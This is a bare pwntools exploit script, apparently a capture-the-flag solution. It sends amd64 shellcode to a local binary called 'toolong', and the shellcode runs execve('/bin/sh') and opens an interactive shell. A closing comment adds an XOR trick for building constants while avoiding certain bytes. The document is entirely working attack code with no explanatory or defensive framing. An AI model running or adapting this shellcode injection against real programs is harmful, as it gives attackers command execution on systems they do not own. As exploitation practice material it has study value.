from pwn import *
r = process('./toolong')

context(arch = 'amd64', os = 'linux')

r.send('0x00')
r.send(b'\x00\x00' + asm(
f"""
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi,rsi
    push rsi
    mov rsi,rsp
    xor rdx,rdx
    push 0x3b
    pop rax
    syscall
"""))

r.interactive()
'''
mov rsi, 0x4028636f2e49226f
mov rdx, 0x4040104040204040
xor rsi, rdx
'''